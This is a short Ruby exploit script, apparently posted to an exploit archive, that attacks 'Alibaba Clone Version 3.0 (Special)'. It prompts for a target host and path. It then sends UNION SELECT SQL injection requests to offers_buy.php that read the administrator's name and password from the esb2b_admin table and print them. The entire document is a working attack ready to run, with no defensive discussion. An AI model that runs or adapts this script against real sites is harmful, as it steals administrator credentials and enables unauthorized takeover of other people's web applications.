#!/usr/bin/ruby
#4004-security-project.com
#Discovered and vulnerability by Easy Laster
require 'net/http'
print "
#########################################################
#               4004-Security-Project.com               #
#########################################################
#  Alibaba Clone Version 3.0 (Special) SQL Injection    #
#                  Vulnerability Exploit                #
#                      Using Host+Path                  #
#                       demo.com /cms/                  #
#                         Easy Laster                   #
#########################################################
"
block = "#########################################################"
print ""+ block +""
print "\nEnter host name (site.com)->"
host=gets.chomp
print ""+ block +""
print "\nEnter script path (/cms/ or /)->"
path=gets.chomp
print ""+ block +""
begin
dir = "offers_buy.php?id=9999+union+select+0,0,concat(0x23,0x23,0x23,0x23,0x23,es_admin_name,0x23,0x23,0x23,0x23,0x23),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0+from+esb2b_admin--"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe Admin Name is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "offers_buy.php?id=9999+union+select+0,0,concat(0x23,0x23,0x23,0x23,0x23,es_pwd,0x23,0x23,0x23,0x23,0x23),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0+from+esb2b_admin--"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe Password is  -> "+(/#####(.+)#####/).match(resp.body)[1]
print "\n"+ block +""
rescue
print "\nExploit failed"
end
